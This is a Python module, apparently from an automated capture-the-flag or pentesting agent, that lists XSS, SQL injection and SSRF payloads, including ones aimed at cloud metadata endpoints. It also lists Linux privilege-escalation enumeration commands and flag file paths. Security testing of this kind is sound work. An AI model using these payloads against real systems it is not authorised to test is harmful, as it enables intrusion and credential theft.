"""Curated payload library organized by vulnerability class.
Payloads are context-aware: the attacker agent selects based on tech stack.
"""

XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

SQLI_BOOLEAN_PAYLOADS = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1 AND 1=1--", "1 AND 1=2--"),
]

SQLI_TIME_PAYLOADS = [
    "1'; SELECT SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
]

SSRF_PAYLOADS = [
    "http://{oast_token}.{oast_server}/ssrf",
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDSv1
    "http://metadata.google.internal/",            # GCP
]

PRIVESC_CHECKS = [
    "sudo -l",
    "find / -perm -4000 -type f 2>/dev/null",
    "crontab -l && cat /etc/crontab 2>/dev/null",
    "ss -tlnp",
    "id && whoami",
]

FLAG_PATTERNS = ["HTB{", "THM{", "FLAG{", "flag{"]
FLAG_PATHS = ["/root/root.txt", "/home/*/user.txt"]
